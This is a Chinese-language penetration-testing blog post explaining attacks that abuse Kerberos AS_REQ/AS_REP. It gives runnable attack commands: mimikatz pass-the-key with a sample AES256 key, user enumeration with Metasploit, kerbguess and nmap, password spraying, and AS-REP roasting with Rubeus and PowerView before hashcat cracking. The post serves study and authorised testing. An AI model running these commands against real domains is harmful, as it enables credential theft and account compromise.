---
title: "AS_REQ & AS_REP引出的安全问题"
date: 2020-11-12T11:36:02+08:00
draft: false
tags:
- Kerberos
series:
- Windows协议
categories:
- 渗透测试
---

上文讲了AS_REQ & AS_REP的流程和各个字段的解释。本文将讲述其中产生的问题和如何利用。
<!--more-->

# Pass The Hash & Pass The Key
在AS_REQ中使用用户hash加密时间戳，所以不需要明文，pth和ptk就可以实现认证获取票据。

pth不演示了，用ntlm hash搞就行，在补丁kb2871997之后可以用ptk。这个补丁具体的作用参考 https://blog.csdn.net/Ping_Pig/article/details/109171690 先mark

> ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.

```
sekurlsa::ekeys
sekurlsa::pth /user:testadmin /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c
```
# 用户名枚举
用户名不存在时
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/31a55b64-1236-18b6-5940-b1d347900d77.png)

用户名存在但是密码不正确时
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f55fa841-df91-8055-01f6-898c21919c17.png)

工具

```
msf auxiliary/gather/kerberos_enumusers
java –jar kerbguess.jar –r [domain] –d [user list] –s [DC IP]
nmap –p 88 –script-args krb5-enum-users.realm='[domain]',userdb=[user list] [DC IP]
```

# 密码喷洒
密码不正确时
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f55fa841-df91-8055-01f6-898c21919c17.png)
密码正确时
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f47db59d-1595-c5e2-2537-b64c925df812.png)

通过少量密码爆破大量用户名，避免锁定账户。

工具 https://github.com/dafthack/DomainPasswordSpray

# AS-REPRoasting
对于域用户，如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令。

利用前提：域用户设置了选项”Do not require Kerberos preauthentication”。通常情况下，该选项默认不会开启。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/c444f578-e43e-e0af-1682-b9577cebba01.png)

利用

```
Rubeus.exe asreproast
```
需要域账户或者机器账户运行

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/022cf334-9456-e809-5c1a-dd144b640539.png)

扔到hashcat就可以了

powerview中有寻找开启了`Do not require Kerberos preauthentication`选项用户的模块。

```
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Verbose
```
# 黄金票据
放到后面和白银票据一起

# 参考
1. https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997
2. https://daiker.gitbook.io/windows-protocol/kerberos/1
3. https://blog.csdn.net/Ping_Pig/article/details/109171690
4. [域渗透——AS-REPRoasting](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AS-REPRoasting/)
5. https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**